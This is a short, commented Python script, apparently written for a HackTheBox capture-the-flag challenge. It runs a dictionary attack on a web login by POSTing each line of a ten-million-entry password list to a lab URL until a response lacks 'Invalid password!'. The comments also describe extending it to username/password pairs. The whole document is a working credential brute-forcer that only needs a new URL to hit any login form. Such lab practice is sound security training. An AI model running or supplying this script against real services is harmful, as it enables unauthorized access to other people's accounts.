#This is a python password testing tool for a specific use case written by Evan Lutz.


#requests library is for initiating HTTP methods in python
import requests
#this is a dictionary attack that tests 10 million common passwords.
f = open('10milpwlist.txt','r')
#a counter is added to know where I am in this list and how many passwords have been tested so far.
count = 1
#the file is formatted with one password per line.
for line in f:
	#this website only has a password parameter to test. If I was to use a username and password,
	#I would utlize a second username file and a nested loop, with an additional dictionary entry
	#of 'username':str(user), based on the line item variable assigned for the usernames.
	r = requests.post('http://docker.hackthebox.eu:34224/', data={'password':str(line)})
	#this is unique to this particular webpage and the returned html starts with 'Invalid password!'
	#so should I find a successful password, the inclination is to believe that it wouldn't contain that string.
	if 'Invalid password!' not in r.text:
		print ('The password is ' + line)
		break
	else:
		print (str(count) + ' incorrect passwords attempted.')
	count += 1
